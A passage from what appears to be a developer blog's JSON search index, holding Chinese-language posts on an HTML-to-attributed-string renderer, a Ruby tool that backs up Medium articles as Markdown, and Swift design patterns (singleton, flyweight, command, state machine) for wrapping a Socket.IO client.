Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }使用{// NSBackgroundColor = \"UIExtendedSRGBColorSpace 0 1 0 1\";// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }，並已了解跨境商品之物流需求{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }顯示結果：Done!這樣我們就完成了透過 XMLParser 自行實現 HTML Render 功能，並且保留擴充性跟規格性，可以從 Code 上管理、了解到目前 App 能支援的字串渲染類型。完整 Github Repo 如下 本文同步發表於個人 Blog： [點我前往] 。 有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,090 Total Views Last Statistics Date: 2025-01-19 | 1,565 Views on Medium. " }, { "title": "Converting Medium Posts to Markdown", "url": "/posts/ddd88a84e177/", "categories": "ZRealm Dev.", "tags": "medium, markdown, backup, ruby, automation", "date": "2022-05-28 15:04:35 +0800", "snippet": "Converting Medium Posts to Markdown撰寫小工具將 Medium 心血文章備份下來 &amp; 轉換成 Markdown 格式ZhgChgLi / ZMediumToMarkdown[EN] ZMediumToMarkdownI’ve written a project to let you download Medium post and convert i...", "content": "Converting Medium Posts to Markdown撰寫小工具將 Medium 心血文章備份下來 &amp; 轉換成 Markdown 格式ZhgChgLi / ZMediumToMarkdown[EN] ZMediumToMarkdownI’ve written a project to let you download Medium post and convert it to markdown format easily.Features Support download post and convert to markdown format Support download all posts and convert to markdown format from any user without login access. Support download paid content Support download all of post’s images to local and convert to local path Support parse Twitter tweet content to blockquote Support download paid content Support command line interface Convert Gist source code to markdown code block Convert youtube link which embed in post to preview image Adjust post’s last modification date from Medium to the local downloaded markdown file Auto skip when post has been downloaded and last modification date from Medium doesn’t changed (convenient for auto-sync or auto-backup service, to save server’s bandwidth and execution time) Support using Github Action as auto sync/backup service Highly optimized markdown format for Medium Native Markdown Style Render Engine (Feel free to contribute if you any optimize idea! MarkupStyleRender.rb ) jekyll &amp; social share (og: tag) friendly 100% Ruby @ RubyGem[CH] ZMediumToMarkdown可針對 Medium 文章連結、Medium 使用者的所有文章，爬取其內容並轉換成 Markdwon 格式連同文章內圖片一同下載下來的備份小工具。[2022/07/18 Update]： 手把手教你無痛轉移 Medium 到自架網站特色功能 免登入、免特殊權限 支援單篇文章、使用者所有文章下載並轉換成 Markdown 支援下載備份文章內的所有圖片並轉換成對應圖片路徑 支援深度解析內嵌於文章中的 Gist 並轉換成相對語言的 Markdown Code Block 支援解析 Twitter 內容並轉貼到文章中 支援解析內嵌於文章中的 Youtube 影片，將轉換成影片預覽圖及連結顯示於 Markdown 使用者所有文章下載時會去掃描文章內有無嵌入關聯文章，有的話會將連結替換為本地 針對 Medium 格式樣式特別優化 自動將下載下來文章的最後修改/建立時間，更改為同 Medium 文章發佈時間 自動比對下載下來的文章最後修改，如果沒有小於 Medium 文章最後修改時間時則自動跳過(方便大家使用此工具建立自動 Sync/Backup 工具，此機制能節省 server 流量/時間) CLI 操作，支援自動化 本項目及本篇文章僅供技術研究，請勿用於任何商業用途，請勿用於非法用途，如有任何人憑此做何非法事情，均於作者無關，特此聲明。 請確認您有文章使用、著作權再行下載備份。起源經營 Medium 第三年，已累積發表超過 65 篇文章；所有文章都是我直接使用 Medium 平台撰寫，沒有其他備份；老實說一直很怕 Medium 平台有狀況或是其他因素導致這幾年的心血結晶消失。之前曾經手動備份過，非常無聊且浪費時間，所以一直在找尋一個可以自動把所有文章備份下載下來的工具、最好還能轉換成 Markdown 格式。備份需求 Markdown 格式 依照 User 能自動下載該 User 的所有 Medium Posts 文章圖片也要能被下載備份下來 要能 Parse Gist 成 Markdown Code Block(我的 Medium 大量使用 gist 嵌入 Source Code 所以這個功能很重要)備份方案Medium 官方官方雖然有提供匯出備份功能，但匯出格式僅能用於匯入 Medum、非 Markdown 或共通格式，而且不會處理 Github Gitst …等等 Embed 的內容。Medium 提供的 API 沒什麼在維護且只提供 Create Post 功能。 合理，因為 Medium 官方不希望使用者能輕易地將內容轉移至其他平台。Chrome Extension有找到試用了幾個 Chrome Extension (幾乎都被下架了)，效果不好，一是要手動一篇文章一篇文章點進去備份、二是 Parse 出來的格式很多錯誤而且也無法深度 Parse Gist Source Code 出來、也無法備份文章的所有圖片下來。medium-to-markdown command line某位大神用 js 寫的，能達成基本的下載及轉換成 Markdown 功能，但一樣沒圖片備份、深度 Parse Gist Source Code。ZMediumToMarkdown苦無完美解決方案後，下定決心自行撰寫一個備份轉換工具；花費了大約三週的下班時間使用 Ruby 完成。技術細節如何透過輸入使用者名稱得到文章列表？1.取得 UserID：檢視使用者主頁(https://medium.com/@# {username} ) 原始碼可以找到 Username 對應的 UserID 這邊要注意因為 Meidum 重新開放自訂網域 所以要多處理 30X 轉址2.嗅探網路請求可以發現 Medium 使用 GraphQL 去取得主頁的文章列表資訊3.複製 Query &amp; 替換 UserID 到請求資訊HOST: https://medium.com/_/graphqlMETHOD: POST4.取得 Response每次只能拿 10 筆，要分頁拿取。 文章列表：可以在 result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;posts 中取得 homepagePostsFrom 分頁資訊 ：可以在 result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;pagingInfo-&gt;next 中取得將 homepagePostsFrom 帶入請求即可進行分頁存取， nil 時代表已沒有下一頁如何剖析文章內容？檢視文章原始碼後可發現，Medium 是使用 Apollo Client 服務進行架設；其端 HTML 實際是從 JS 渲染而來；因此可以再檢視原始碼中的 &lt;script&gt; 區段找到 window.__APOLLO_STATE__ 字段，內容就是整篇文章的段落架構，Medium 會把你整篇文章拆成一句一句的段落，再透過 JS 引擎渲染回 HTML。我們要做的事也一樣，解析這個 JSON，比對 Type 在 Markdown 的樣式，組合出 Markdown 格式。技術難點這邊有一個技術困難點就是在渲染段落文字樣式時，Medium 給的結構如下：\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}意思是 code in text, and link in text, and ZhgChgLi, and bold, and I, only i 這段文字的:- 第 5 到第 7 字元要標示為 程式碼 (用`Text`格式包裝)- 第 18 到第 22 字元要標示為 連結 (用[Text](URL)格式包裝)- 第 50 到第 63 字元要標示為 粗體(用*Text*格式包裝)- 第 55 到第 69 字元要標示為 斜體(用_Text_格式包裝)第 5 到 7 &amp; 18 到 22 在這個例子裡好處理，因為沒有交錯到；但 50–63 &amp; 55–69 會有交錯問題，Markdown 無法用以下交錯方式表示：code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, **only i_正確的組合結果如下：code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, _**_only i_50–55 STRONG 55–63 STRONG, EM 63–69 EM另外要需注意： 包裝格式的字串頭跟尾要能區別，Strong 只是剛好頭跟尾都是 ** ，如果是 Link 頭會是 [ 尾則是 ](URL) Markdown 符號與字串結合時要注意前後不能有空白，否則會失效完整問題請看此。這塊研究了好久，目前先使用現成套件解決 reverse_markdown 。 特別感謝前同事 Nick , Chun-Hsiu Liu ,James 協力研究，之後有時間再自己寫改成原生的。成果原文 -&gt; 轉換後的 Markdown 結果有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 476 Total Views Last Statistics Date: 2025-01-19 | 417 Views on Medium. " }, { "title": "Design Patterns 的實戰應用紀錄", "url": "/posts/78507a8de6a5/", "categories": "Pinkoi Engineering", "tags": "ios-app-development, design-patterns, socketio, websocket, finite-state-machine", "date": "2022-04-07 22:49:17 +0800", "snippet": "Design Patterns 的實戰應用紀錄封裝 Socket.IO Client Library 需求時遇到的問題場景及解決方法應用到的 Design PatternsPhoto by Daniel McCullough前言此篇文章是真實的需求開發，所運用到 Design Pattern 解決問題的場景記錄；內容篇幅會涵蓋需求背景、實際遇到的問題場景 (What?)、為何要套用 Patt...", "content": "Design Patterns 的實戰應用紀錄封裝 Socket.IO Client Library 需求時遇到的問題場景及解決方法應用到的 Design PatternsPhoto by Daniel McCullough前言此篇文章是真實的需求開發，所運用到 Design Pattern 解決問題的場景記錄；內容篇幅會涵蓋需求背景、實際遇到的問題場景 (What?)、為何要套用 Pattern 解決問題 (Why?)、實作上如何使用 (How?)，建議可以從頭閱讀會比較有連貫性。 本文會介紹四個開發此需求遇到的場景及七個解決此場景的 Design Patterns 應用。背景組織架構敝司於今年拆分出 Feature Teams (multiple) 與 Platform Team；前者不必多說主要負責使用者端需求、Platform Team 這邊則面對的是公司內部的成員，其中一個工作項目就是技術引入、基礎建設及做好系統性整合，為 Feature Teams 開發需求時先鋒鋪好道路。當前需求Feature Teams 要將原本的訊息功能 (進頁面打 API 拿訊息資料，要更新最新訊息只能重整) 改為 即時通訊 (能即時收到最新訊息、對傳訊息)。Platform Team 工作Platform Team 著重的點不只是當下的即時通訊需求，而是長遠的建設與複用性；評估後 webSocket 雙向通訊的機制在現代 App 中是不可或缺，除了此次的需求之外，以後也有很多機會都會用到，加上人力資源許可，故投入協助設計開發介面。目標： 封裝 Pinkoi Server Side 與 Socket.IO 通訊、身份驗證邏輯 封裝 Socket.IO 煩瑣操作，提供基於 Pinkoi 商業需求的可擴充及方便使用介面 統一雙平台介面 (Socket.IO 的 Android 與 iOS Client Side Library 支援的功能及介面不相同) Feature 端無需了解 Socket.IO 機制 Feature 端無需管理複雜的連線狀態 未來有 webSocket 雙向通訊需求能直接使用時間及人力： iOS &amp; Android 各投入一位 開發時程：時程 3 週技術細節Web &amp; iOS &amp; Android 三平台均會支援此 Feature；要引入 webSocket 雙向通訊協議來實現，後端預計直接使用 Socket.io 服務。 首先要說 Socket != WebSocket關於 Socket 與 WebSocket 及技術細節可參考以下兩篇文章： Socket，Websocket，Socket.io的差異 为什么不直接使用socket ,还要定义一个新的websocket 的呢？簡而言之：Socket 是 TCP/UDP 傳輸層的抽象封裝介面，而 WebSocket 是應用層的傳輸協議。Socket 與 WebSocket 的關係就像狗跟熱狗的關係一樣，沒有關係。Socket.IO 是 Engine.IO 的一層抽象操作封裝，Engine.IO 則是對 WebSocket 的使用封裝，每層只負責對上對下之間的交流，不允許貫穿操作(e.g. Socket.IO 直接操作 WebSocket 連線)。Socket.IO/Engine.IO 除了基本的 WebSocket 連線外還實做了很多方便好用的功能集合(e.g. 離線發送 Event 機制、類似 Http Request 機制、Room/Group 機制…等等)。Platform Team 這層的主要職責是橋接 Socket.IO 與 Pinkoi Server Side 之間的邏輯，供應上層 Feature Teams 開發功能時使用。Socket.IO Swift Client 有坑 已許久未更新 (最新一版還在 2019)，不確定是否還有在維護。 Client &amp; Server Side Socket IO Version 要對齊，Server Side 可加上 {allowEIO3: true} / 或 Client Side 指定相同版本 .version 否則怎麼連都連不上。 命名方式、介面與官網範例很多都對不起來。 Socket.io 官網範例都是拿 Web 做介紹，實際上 Swift Client 並不一定有全支援官網寫的功能 。此次實作發現 iOS 這邊 Library 並未實現離線發送 Event 機制(我們是自行實現的，請往後繼續閱讀) 建議有要採用 Socket.IO 前先實驗看看你想要的機制是否支援。 Socket.IO Swift Client 是基於 Starscream WebSocket Library 的封裝，必要時可降級使用 Starscream。背景資訊補充到此結束，接下來進入正題。Design Patterns設計模式說穿了就只是軟體設計當中常見問題的解決方案，不一定要用設計模式才能開發、設計模式不一定能適用所有場景、也沒人說不能自行歸納出新的設計模式。The Catalog of Design Patterns但現有的設計模式 (The 23 Gang of Four Design Patterns) 已是軟體設計中的共同知識，只要提到 XXX Pattern 大家腦中就會有相應的架構藍圖，不需多做解釋、後續維護也比較好知道脈絡、且已是經過業界驗證的方法不太需要花時間審視物件依賴問題；在適合的場景選用適合的模式可以降低溝通及維護成本，提升開發效率。 設計模式可以組合使用，但不建議對現有設計模式魔改、強行為套用而套用、套用不符合分類的 Pattern (e.g. 用責任練模式來產生物件)，會失去使用的意義更可能造成後續接手的人的誤會。本篇會提到的 Design Patterns： Singleton Pattern Flywieght Pattern Factory Pattern Command Pattern Finite-State Machine + State Pattern Chain Of Resposibility Builder Pattern會逐一在後面解釋什麼場境用了、為何要用。 本文著重在 Design Pattern 的應用，而非 Socket.IO 的操作，部分示例會因為描述方便而有所刪減， 無法適用真實的 Socket.IO 封裝 。 因篇幅有限，本文不會詳細介紹每個設計模式的架構，請先點各個模式的連結進入了解該模式的架構後再繼續閱讀。 Demo Code 會使用 Swift 撰寫。需求場景 1.What? 使用相同的 Path 在不同頁面、Object 請求 Connection 時能複用取得相同的物件。 Connection 需為抽象介面，不直接依賴 Socket.IO ObjectWhy? 減少記憶體開銷及重複連線的時間、流量成本。 為未來抽換成其他框架預留空間How? Singleton Pattern ：創建型 Pattern，保證一個物件只會有一個實體。 Flywieght Pattern ：結構型 Pattern，基於共享多個物件相同的狀態，重複使用。 Factory Pattern ：創建型 Pattern，抽象物件產生方法，使其能在外部抽換。實際案例使用： Singleton Pattern： ConnectionManager 在 App Lifecycle 中僅存在一個的物件，用來管理 Connection 取用操作。 Flywieght Pattern： ConnectionPool 顧名思義就是 Connection 的共用池子，統一從這個池子的方法拿出 Connection，其中邏輯就會包含當發現 URL Path 一樣時直接給予已經在池子裡的 Connection。ConnectionHandler 則做為 Connection 的外在操作、狀態管理器。 Factory Pattern： ConnectionFactory 搭配上面 Flywieght Pattern 當發現池子沒有可複用的 Connection 時則用此工廠介面去產生。import Combineimport Foundationprotocol Connection { var url: URL {get} var id: UUID {get} init(url: URL) func connect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}protocol ConnectionFactory { func create(url: URL) -&gt; Connection}class ConnectionPool { private let connectionFactory: ConnectionFactory private var connections: [Connection] = [] init(connectionFactory: ConnectionFactory) { self.connectionFactory = connectionFactory } func getOrCreateConnection(url: URL) -&gt; Connection { if let connection = connections.first(where: { $0.url == url }) { return connection } else { let connection = connectionFactory.create(url: url) connections.append(connection) return connection } } }class ConnectionHandler { private let connection: Connection init(connection: Connection) { self.connection = connection } func getConnectionUUID() -&gt; UUID { return connection.id }}class ConnectionManager { static let shared = ConnectionManager(connectionPool: ConnectionPool(connectionFactory: SIOConnectionFactory())) private let connectionPool: ConnectionPool private init(connectionPool: ConnectionPool) { self.connectionPool = connectionPool } // func requestConnectionHandler(url: URL) -&gt; ConnectionHandler { let connection = connectionPool.getOrCreateConnection(url: url) return ConnectionHandler(connection: connection) }}// Socket.IO Implementationclass SIOConnection: Connection { let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}class SIOConnectionFactory: ConnectionFactory { func create(url: URL) -&gt; Connection { // return SIOConnection(url: url) }}//print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/2\")!).getConnectionUUID().uuidString)// output:// D99F5429-1C6D-4EB5-A56E-9373D6F37307// D99F5429-1C6D-4EB5-A56E-9373D6F37307// 599CF16F-3D7C-49CF-817B-5A57C119FE31需求場景 2.What?如背景技術細節所述，Socket.IO Swift Client 的 Send Event 並不支援離線發送 (但 Web/Android 版的 Library 卻可以)，因此 iOS 端需要自行實現此功能。神奇的是 Socket.IO Swift Client - onEvent 是支援離線訂閱的。Why? 跨平台功能統一 程式碼容易理解How? Command Pattern ：行為型 Pattern，將操作包裝成對象，提供隊列、延遲、取消…等等集合操作。 Command Pattern： SIOManager 為與 Socket.IO 溝通的最底層封裝，其中的 send 、 request 方法都是對 Socket.IO Send Event 的操作，當發現當前 Socket.IO 處於斷線狀態，則將請求參數放到 bufferedCommands 中，當連上之後就逐一拿出來處理 (First In First Out)。protocol BufferedCommand { var sioManager: SIOManagerSpec? { get set } var event: String { get } func execute()}struct SendBufferedCommand: BufferedCommand { let event: String weak var sioManager: SIOManagerSpec? func execute() { sioManager?.send(event) }}struct RequestBufferedCommand: BufferedCommand { let event: String let callback: (Data?) -&gt; Void weak var sioManager: SIOManagerSpec? func execute() { sioManager?.request(event, callback: callback) }}protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected同理也可以實現到 onEvent 上。延伸：可以再套用 Proxy Pattern ，將 Buffer 功能視為一種 Proxy。需求場景 3.What?Connection 有多個狀態，有序的狀態與狀態間切換、各狀態允許不同的操作。 Created：物件被建立，允許 -&gt; Connected 或直接進 Disconnected Connected：已連上 Socket.IO，允許 -&gt; Disconnected Disconnected：已與 Socket.IO 斷線，允許 -&gt; Reconnectiong 、 Released Reconnectiong：正在嘗試重新連上 Socket.IO，允許 -&gt; Connected 、 Disconnected Released：物件已被標示為等待被記憶體回收，不允許任何操作及切換狀態Why? 狀態與狀態的切換邏輯跟表述不容易 各狀態要限制操作方法(e.g. State = Released 時無法 Call Send Event)，直接使用 if. .else 會讓程式難以維護閱讀How? Finite State Machine ：管理狀態間的切換 State Pattern ：行為型 Pattern，對象的狀態有變化時，有不同的相應處理 Finite State Machine ： SIOConnectionStateMachine 為狀態機實作， currentSIOConnectionState 為當前狀態， created、connected、disconnected、reconnecting、released 表列出此狀態機可能的切換狀態。enterXXXState() throws 為從 Current State 進入某個狀態時的允許與不允許(throw error)實作。 State Pattern ： SIOConnectionState 為所有狀態會用到的操作方法介面抽象。protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected//class SIOConnectionStateMachine { private(set) var currentSIOConnectionState: SIOConnectionState! private var created: SIOConnectionState! private var connected: SIOConnectionState! private var disconnected: SIOConnectionState! private var reconnecting: SIOConnectionState! private var released: SIOConnectionState! init() { self.created = SIOConnectionCreatedState(stateMachine: self) self.connected = SIOConnectionConnectedState(stateMachine: self) self.disconnected = SIOConnectionDisconnectedState(stateMachine: self) self.reconnecting = SIOConnectionReconnectingState(stateMachine: self) self.released = SIOConnectionReleasedState(stateMachine: self) self.currentSIOConnectionState = created } func enterConnected() throws { if [created.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(connected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Connected\") } } func enterDisconnected() throws { if [created.connectionState, connected.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(disconnected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Disconnected\") } } func enterReconnecting() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(reconnecting) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Reconnecting\") } } func enterReleased() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(released) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Released\") } } private func enter(_ state: SIOConnectionState) { currentSIOConnectionState = state }}protocol SIOConnectionState { var connectionState: ConnectionState { get } var stateMachine: SIOConnectionStateMachine { get } init(stateMachine: SIOConnectionStateMachine) func onConnected() throws func onDisconnected() throws func connect(socketManager: SIOManagerSpec) throws func disconnect(socketManager: SIOManagerSpec) throws func release(socketManager: SIOManagerSpec) throws func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func send(socketManager: SIOManagerSpec, event: String) throws}struct SIOConnectionStateMachineError: Error { let message: String init(_ message: String) { self.message = message } var localizedDescription: String { return message }}class SIOConnectionCreatedState: SIOConnectionState { let connectionState: ConnectionState = .created let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"CreatedState can't disconnect!\") }}class SIOConnectionConnectedState: SIOConnectionState { let connectionState: ConnectionState = .connected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { // } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionDisconnectedState: SIOConnectionState { let connectionState: ConnectionState = .disconnected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { // } func release(socketManager: SIOManagerSpec) throws { try stateMachine.enterReleased() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { try stateMachine.enterReconnecting() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReconnectingState: SIOConnectionState { let connectionState: ConnectionState = .reconnecting let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReleasedState: SIOConnectionState { let connectionState: ConnectionState = .released let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onConnected!\") } func onDisconnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onDisconnected!\") } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't release!\") } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw 